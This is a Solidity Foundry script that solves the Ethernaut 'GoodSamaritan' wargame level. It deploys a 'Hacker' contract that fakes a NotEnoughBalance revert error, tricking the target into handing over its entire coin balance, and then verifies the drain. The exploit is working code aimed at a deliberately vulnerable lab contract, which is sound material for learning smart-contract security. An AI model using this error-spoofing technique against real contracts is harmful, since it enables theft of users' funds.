// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {GoodSamaritan, Coin} from "../../challenge-contracts/27-GoodSamaritan.sol";

contract GoodSamaritanSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x36E92B2751F260D6a4749d7CA58247E7f8198284;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Get GoodSamaritan contract;
        GoodSamaritan samaritan = GoodSamaritan(challengeInstance);

        // Step 2: Get GoodSamaritan contract's Coin balance;
        address addrWallet = address(samaritan.wallet());
        Coin coin = Coin(address(samaritan.coin()));
        uint balance = coin.balances(addrWallet);

        // Step 3: Deploy Hacker contract;
        Hacker hacker = new Hacker(challengeInstance);

        // Step 4: Call `drain()` function of Hacker contract,
        hacker.drain();

        // Step 5: Confirm that the Hacker contract has successfully drained GoodSamaritan contract's Coin balance.
        address hackerAddress = address(hacker);
        require(
            coin.balances(addrWallet) == 0,
            "GoodSamaritan balance check failed"
        );
        require(
            coin.balances(hackerAddress) == balance,
            "Hacker balance check failed"
        );

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(27));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Hacker {
    error NotEnoughBalance();

    GoodSamaritan samaritan;

    constructor(address challengeInstance) {
        samaritan = GoodSamaritan(challengeInstance);
    }

    function drain() external {
        samaritan.requestDonation();
    }

    function notify(uint amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
